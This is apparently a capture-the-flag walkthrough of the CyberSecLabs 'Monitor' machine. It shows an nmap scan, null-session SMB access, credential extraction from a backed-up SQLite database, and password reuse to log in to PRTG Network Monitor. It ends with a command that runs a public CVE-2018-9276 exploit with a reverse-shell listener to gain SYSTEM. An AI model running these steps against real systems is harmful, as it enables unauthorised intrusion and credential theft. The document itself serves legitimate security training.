---
description: https://www.cyberseclabs.co.uk/labs/info/Monitor/
---

# Monitor

![](<../../../.gitbook/assets/image (648).png>)

## Nmap

```
kali@kali:~$ nmap 172.31.1.21 -p- -sV

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Indy httpd 18.1.38.11958 (Paessler PRTG bandwidth monitor)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## SMB

As per usual I start with a quick null authentication check using `smbclient`. We see we are able to list shares and then able to connect into the 'WebBackups' share. From here we only have one folder listen which is a zip file. We use the `get` command to download the file before moving on to inspecting its contents.

![](<../../../.gitbook/assets/image (649).png>)

After unzipping the zip file with the `unzip` command we see the contents listed below. An immediate interesting file is db.sqlite3 file which is a database file.

![](<../../../.gitbook/assets/image (650).png>)

Kali comes pre-installed with a application called 'DB Browser for SQlite' which we can use to open the db.sqlite3.

![](<../../../.gitbook/assets/image (652).png>)

Moving over to the 'Browse Data' tab we see we have some credentials for `django:Se7vmMqP0al`

![](<../../../.gitbook/assets/image (653) (1).png>)

For now we are finished with the database file.

## HTTP

When we head over to the root page of 172.31.1.21 we come to an install of PRTG network monitor.

![](<../../../.gitbook/assets/image (654).png>)

I looked up the default credentials which are `prtgadmin:prtgadmin`. The default credentials did not provide myself access to the login. I also tried the credentials we pulled from the database earlier and they not did not either.

I did then try the password of 'Se7vmMqP0al' with the default PRTG username of 'prtgadmin' and was able to login.

![http://172.31.1.21/welcome.htm](<../../../.gitbook/assets/image (655) (1).png>)

## Exploitation

Researching exploits for PRTG network monitor on or below version 18.1.38.11958 as defined at the bottom of the root page we come to quite a few potential exploits. The easiest and most reliable I found was a PoC created by wildkindcc.

{% embed url="https://github.com/wildkindcc/CVE-2018-9276" %}

![](<../../../.gitbook/assets/image (656).png>)

We can then run the exploit with the required parameters.

```
python2 exploit.py -i 172.31.1.21 -p 80 --lhost <IP> --lport 4455 --user prtgadmin --password Se7vmMqP0al
```

![](<../../../.gitbook/assets/image (657).png>)

We are now SYSTEM on the server.
